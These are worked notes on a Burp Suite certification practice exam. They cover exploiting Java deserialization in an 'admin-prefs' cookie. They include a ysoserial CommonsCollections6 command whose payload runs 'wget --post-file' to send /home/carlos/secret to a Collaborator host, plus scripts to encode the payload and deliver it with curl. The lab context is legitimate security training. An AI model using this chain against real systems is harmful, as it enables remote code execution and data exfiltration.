# BSCP Practice Exam - Stage 3 via `admin-prefs` cookie Java deserialization (worked notes)

Field notes from a fully solved practice exam app (chain: reflected DOM XSS in search -> error-based
ORDER BY SQLi in advanced search -> this). The practice exam app objective is fixed; the vuln per
stage is randomized:

- Stage 1 - get access to a low-privileged user account
- Stage 2 - escalate to the administrator account
- Stage 3 - read `/home/carlos/secret`, submit its content via `Submit solution`
  (`POST /submitSolution`, param `answer`, success `{"correct":true}`). Deleting carlos is NOT the goal.

## Finding the vector
After you have an admin session, re-check `Set-Cookie` on the admin pages. Visiting `/admin` sets:

```
admin-prefs=<value>;  Path=/admin;  HttpOnly
```

The value is `urlencode(base64(gzip(<java serialized object>)))`. The gzip header base64s to `H4sI`,
so a cookie starting `H4sI...` is a gzip blob. This cookie is set ONLY inside the admin area, so a
login/home cookie dump never reveals it. Decode to confirm:

```python
import urllib.parse, base64, gzip
raw = gzip.decompress(base64.b64decode(urllib.parse.unquote(cookie)))
assert raw[:4] == b'\xac\xed\x00\x05'      # Java serialized object
# raw leaks the class, e.g. lab.actions.common.serializable.AdminPrefs
```

## Exploit (RCE -> file read)
No output channel, so exfil the file to Burp Collaborator with `wget --post-file`. `Runtime.exec`
has no shell, so `$(...)`, pipes and redirects do not work - `wget --post-file=<path>` reads the
file directly without shell features.

```bash
# CommonsCollections6 worked (CC7 too). CC1-5 returned HTTP 500 with NO execution - cycle gadgets.
java -jar ysoserial.jar CommonsCollections6 \
  'wget http://COLLAB.oastify.com --post-file=/home/carlos/secret' > payload.bin

# re-wrap exactly like the original cookie: gzip -> base64 -> urlencode
PREFS=$(python3 -c "import gzip,base64,urllib.parse;print(urllib.parse.quote(base64.b64encode(gzip.compress(open('payload.bin','rb').read())).decode()))")

curl -sk https://TARGET/admin -H "Cookie: session=$ADMIN_SESSION; admin-prefs=$PREFS"
# HTTP 500 == deserialization fired. The file content (solution-<rand>) lands as the POST body in Collaborator.
```

Notes: `ysoserial` needs Java 8/11. `java -jar ysoserial.jar` lists gadgets. If `/admin` 500s but the
callback stays silent, the gadget chain is not on the classpath - try `CommonsCollections1..7`,
`Groovy1`, `Spring1`.
